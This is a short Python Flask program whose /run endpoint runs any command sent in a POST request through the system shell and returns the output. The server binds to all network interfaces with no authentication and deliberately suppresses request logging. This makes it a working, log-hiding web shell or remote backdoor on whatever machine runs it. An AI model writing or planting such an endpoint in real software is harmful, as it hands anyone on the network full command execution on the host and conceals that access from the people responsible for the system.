from flask import Flask, request, jsonify
import subprocess, os, time

app = Flask(__name__)
cwd = os.getcwd()  # track current working directory


@app.route("/run", methods=["POST"])
def run_command():
    global cwd
    cmd = request.json.get("command", "").strip()
    output = ""

    try:
        # Handle cd command
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            new_dir = os.path.abspath(os.path.join(cwd, path))
            os.chdir(new_dir)
            cwd = new_dir
            output = "\n".join(os.listdir(cwd))  # show contents like dir

        # Handle dir command
        elif cmd.lower() == "dir":
            output = "\n".join(os.listdir(cwd))

        # Any other shell command
        else:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, cwd=cwd, timeout=20
            )
            output = result.stdout + result.stderr
            if output.strip() == "":
                output = "Command ran but no output detected"

    except Exception as e:
        output = str(e)

    return jsonify({"output": output, "cwd": cwd})

def startServer(port=5000, host="0.0.0.0"):
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)  # suppress request logs

    app.run(host=host, port=port, debug=False, use_reloader=False)
